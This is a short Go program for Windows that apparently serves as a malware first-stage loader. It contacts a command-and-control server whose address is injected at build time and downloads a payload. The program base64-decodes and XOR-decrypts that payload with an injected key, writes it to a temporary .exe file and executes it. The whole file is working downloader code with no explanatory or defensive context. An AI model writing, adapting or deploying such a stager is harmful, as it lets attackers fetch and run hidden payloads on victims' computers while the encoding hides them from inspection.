//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/hex"
	"io"
	"net/http"
	"os"
	"os/exec"
)

var (
	C2URL  string // injected via ldflags
	XORKey string // hex-encoded XOR key, injected via ldflags
)

func main() {
	resp, err := http.Get(C2URL + "/stage/" + XORKey)
	if err != nil {
		os.Exit(1)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		os.Exit(1)
	}

	data, err := base64.StdEncoding.DecodeString(string(body))
	if err != nil {
		os.Exit(1)
	}

	key, err := hex.DecodeString(XORKey)
	if err != nil {
		os.Exit(1)
	}

	for i := range data {
		data[i] ^= key[i%len(key)]
	}

	tmpFile, err := os.CreateTemp("", "*.exe")
	if err != nil {
		os.Exit(1)
	}
	defer tmpFile.Close()

	if _, err := tmpFile.Write(data); err != nil {
		os.Exit(1)
	}
	tmpPath := tmpFile.Name()
	tmpFile.Close()

	exec.Command(tmpPath).Start()
}
